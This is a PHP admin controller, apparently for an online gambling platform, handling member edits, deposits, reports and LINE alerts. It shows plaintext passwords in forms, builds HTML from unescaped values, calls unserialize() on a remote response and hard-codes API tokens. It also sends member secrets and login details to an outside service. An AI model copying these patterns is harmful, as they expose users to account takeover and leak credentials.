		$x_pro = $this->input->post('x_all');
		$text_pro = $this->input->post('text_all');
		$id_pro_1 = $this->input->post('id_pro_all');
		$limit = $this->input->post('limit_all');


		$data = array(

			'id' => $id_pro_1,
			'name' => $name_pro,
			'percen' => $p_pro,
			'x' => $x_pro,
			'text' => $text_pro,
			'limit_d' => $limit
		);

		//print_r($data);die;

		$this->admin_model->edit_proregister_all($data);
		header('Content-Type: application/json');
		echo json_encode(['status' => true, 'msg' => 'ทำรายการแก้ไข สำเร็จครับ']);
	}

	public function edit()
	{
		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'เปลี่ยนข้อมูล Member',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);


		$check = $this->admin_model->admin_stats($user);

		if (($check['stats'] == 109 || $check['stats'] == 99) || $check['stats'] == 0) {
			if ($user) {

				$id = $this->input->post('id');

				$bank = $this->admin_model->bank_all();

				$promotion =  $this->admin_model->get_promotions();
				$data = $this->admin_model->select_user($id);
				$pro = $this->user_model->Promotions($data['username']);




				$html = '
					
					<form method="post">
					
					<input type="hidden" id="id" name="id" value="' . $data['id'] . '">
					
					<div class="form-group">
					
					<label> ชื่อผู้ใช้งาน</label>
					
					<input type="text" name="username" class="form-control cc-name valid" value="' . $data['username'] . '" placeholder="ชื่อผู้ใช้งาน" required disabled>
					
					</div>
					
					<div class="form-group">
					
					<label>รหัสผ่าน</label>
					
					<input type="text" name="password" class="form-control cc-name valid" value="' . $data['password'] . '" placeholder="รหัสผ่าน" required>
					
					</div>
					
					<div class="form-group">
					
					<label>ชื่อบัญชี</label>
					
					<input type="text" name="name" class="form-control cc-name valid" value="' . $data['name'] . '" placeholder="ชื่อบัญชี" required>
					
					</div>
					
					
					<div class="form-group">
					
					<label>เลขบัญชี</label>
					
					<input type="text" name="accnum" class="form-control cc-name valid" value="' . $data['accnum'] . '" placeholder="เลขบัญชี" required>
					
					</div>
					
					
					
					
					<div class="form-group">
					
					<label>ธนาคาร</label>
					
					<div class="form-group mt-1 ml-2 mr-2 mb-2">
					
					<div class="divVariante variante_1 col-xs-12">
					
					<div class="row p-2">
					
					<div class="col d-flex justify-content-center p-1 variante-radio">
					
					<select name="bank" class="form-control">
					
					';



				foreach ($bank as $key => $value) {
					$html .= '
						
						<option value="' . $value['bank_id'] . '"';

					if ($data['bank'] == $value['bank_id']) {
						$html .= 'selected';
					}

					$html .= '>' . $value['bank_name'] . '</option>
						
						';
				}

				$html .= '
					
					</select>
					
					</div>
					
					</div>
					
					</div>
					
					</div>
					
					</div>
					<div class="form-group">
					
					<label>โปรปัจุบัน</label>
					
					<div class="form-group mt-1 ml-2 mr-2 mb-2">
					
					<div class="divVariante variante_1 col-xs-12">
					
					<div class="row p-2">
					
					<div class="col d-flex justify-content-center p-1 variante-radio">
					
					<select name="promotion" class="form-control">
					
					';

				if (@$pro['promotion_id'] == 0) {
					$html .= '<option value="0" selected> ไม่รับโปรโมชั่น </option>';
				} else {
					$html .= '<option value="0" selected> ไม่รับโปรโมชั่น </option>';
				}


				foreach ($promotion as $key => $value) {
					$html .= '
						
						<option value="' . $value['id'] . '"';

					if (@$pro['promotion_id'] == @$value['id']) {
						$html .= 'selected';
					}

					$html .= '>เติมเงินรับ ' . $value['percen'] . '% ทำเทิร์น  ' . $value['x'] . ' เท่า </option>
						
						';
				}

				$html .= '
					
					</select>
					
					</div>
					
					</div>
					
					</div>
					
					</div>
					
					</div>
					
					
					<input type="submit" name="save" value="บันทึก"class="btn btn-success">
					
					
					
					<br>
					
					</form>
					
					';

				echo $html;
			} else {
				header('location: ./');
			}
		}
	}

	private function Balance($user = false)
	{
		$this->load->library('ufa');
		$username = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $username,
			'detail' => 'เช็ค Balance '.$user,
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);

		if ($user) {
			$ufa = $this->user_model->user_ufa($user);
			$username =  $ufa['username'];
			if ($username != '') {
				return json_encode($this->ufa->get_Balance($username));
			} else {
				echo 'error';
			}
		}
	}

	public function logout()
	{
		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'Logout',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);

		$this->session->unset_userdata('stats_admin');
		$this->session->unset_userdata('secert');
		$this->session->unset_userdata('stats');

		header('location: ./');
	}

	private function add_credit($username, $amount)
	{
		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'เติมเงินให้ '.$username,
			'module' => 'Admin Page',
			'ip_address' => $ip

		];
		$this->db->insert('report_activity', $data);
		$this->load->library('ufa');
		return $this->ufa->Deposit($username, $amount); // เติม

	}

	public function report_deposit()
	{
		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'ดูประวัติการฝาก',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);
		$check = $this->admin_model->admin_stats($user);

		if (($check['stats'] == 109 || $check['stats'] == 99) || $check['stats'] == 0) {
			if ($user) {
				return $this->load->view('sys/report_deposit');
			} else {
				header('location: ./');
			}
		}
	}

	public function report_withdraw()
	{
		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'ดูประวัติการถอน',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);
		$check = $this->admin_model->admin_stats($user);

		if (($check['stats'] == 109 || $check['stats'] == 99) || $check['stats'] == 0) {
			if ($user) {
				return $this->load->view('sys/report_withdraw');
			} else {
				header('location: ./');
			}
		}
	}

	public function report_finance()
	{
		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'ดูประวัติการเงิน',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);
		$check = $this->admin_model->admin_stats($user);

		if (($check['stats'] == 109 || $check['stats'] == 99) || $check['stats'] == 0) {
			if ($user) {
				return $this->load->view('sys/report_finance');
			} else {
				header('location: ./');
			}
		}
	}
	public function report_wheelspin()
	{
		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'ดูประวัติการหมุนสปิน',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);
		$check = $this->admin_model->admin_stats($user);

		if (($check['stats'] == 109 || $check['stats'] == 99) || $check['stats'] == 0) {
			if ($user) {
				return $this->load->view('sys/report_wheelspin');
			} else {
				header('location: ./');
			}
		}
	}
	public function setting_wheel()
	{

		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'ตั้งค่าวงล้อ',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);
		if ($user) {

			return $this->load->view('sys/setting_wheel');
		} else {
			header('location: ./');
		}
	}
	public function setting_powyingshup()
	{

		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'ตั้งค่าเป่ายิ้งฉุบ',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);
		if ($user) {

			return $this->load->view('sys/setting_powyingshup');
		} else {
			header('location: ./');
		}
	}
	public function report_powyingshup()
	{

		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'ดูประวัติการเล่นเป่ายิ้งฉุบ',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);
		if ($user) {

			return $this->load->view('sys/report_powyingshup');
		} else {
			header('location: ./');
		}
	}

	public function report_manual()
	{

		$user = $this->session->userdata('stats_admin');
		$ip = $this->input->ip_address();
		$data = [
			'user' => $user,
			'detail' => 'ดูประวัติการจัดการManual ',
			'module' => 'Admin Page',
			'ip_address' => $ip
		];
		$this->db->insert('report_activity', $data);
		if ($user) {

			return $this->load->view('sys/report_manual');
		} else {
			header('location: ./');
		}
	}

	private  function notify_message_report($message, $username, $secert, $stats)
	{
		$seting    = $this->admin_model->result_setting();
		$webname   = $seting['name_web'];
		$SMS = '';
		$ip = $this->input->ip_address();

		$curlip = curl_init();

		curl_setopt_array($curlip, array(
			CURLOPT_URL => "http://ip-api.com/php/{$ip}?fields=country,city,regionName&key=c4j1ih733rks3k2",
			CURLOPT_RETURNTRANSFER => true,
			CURLOPT_ENCODING => "",
			CURLOPT_MAXREDIRS => 10,
			CURLOPT_TIMEOUT => 0,
			CURLOPT_FOLLOWLOCATION => true,
			CURLOPT_HTTP_VERSION => CURL_HTTP_VERSION_1_1,
			CURLOPT_CUSTOMREQUEST => "GET",
		));

		$response = unserialize(curl_exec($curlip));

		curl_close($curlip);

		$agent = $_SERVER['HTTP_USER_AGENT'];
		$browserArray = array(
			'Windows Mobile' => 'IEMobile',
			'Android Mobile' => 'Android',
			'iPhone Mobile' => 'iPhone',
			'Firefox' => 'Firefox',
			'Google Chrome' => 'Chrome',
			'Internet Explorer' => 'MSIE',
			'Opera' => 'Opera',
			'Safari' => 'Safari'
		);
		foreach ($browserArray as $k => $v) {
			if (preg_match("/$v/", $agent)) {
				break;
			} else {
				$k = "Browser Unknown";
			}
		}
		$browser = $k;


		$SMS .= "\nWeb => " . $webname;
		$SMS .= "\nสมาชิก => " . $username . " [ " . $secert . " ]";
		$SMS .= "\nสถานะ => " . $stats;
		$SMS .= "\nระบบ => " . $message;
		$SMS .= "\nIP Login => " . $ip;
		$SMS .= "\nBrowser => " . $browser;
		$SMS .= "\nCity => " . $response['city'] . "," . $response['regionName'];
		$SMS .= "\nCountry => " . $response['country'];
		$SMS .= "\nDate => " . date("Y-m-d H:i:s");


		$token = 'oW0LayiJM4Wdd6VGd0bswVypLdTQGGqW0FnVEthxMQd';
		$queryData = array('message' => $SMS);
		$queryData = http_build_query($queryData, '', '&');
		$headerOptions = array(
			'http' => array(
				'method' => 'POST',
				'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
					. "Authorization: Bearer " . $token . "\r\n"
					. "Content-Length: " . strlen($queryData) . "\r\n",
				'content' => $queryData
			),
		);
		$context = stream_context_create($headerOptions);
		$result = file_get_contents(LINE_API, FALSE, $context);
		$res = json_decode($result);
		return $res;
	}
}
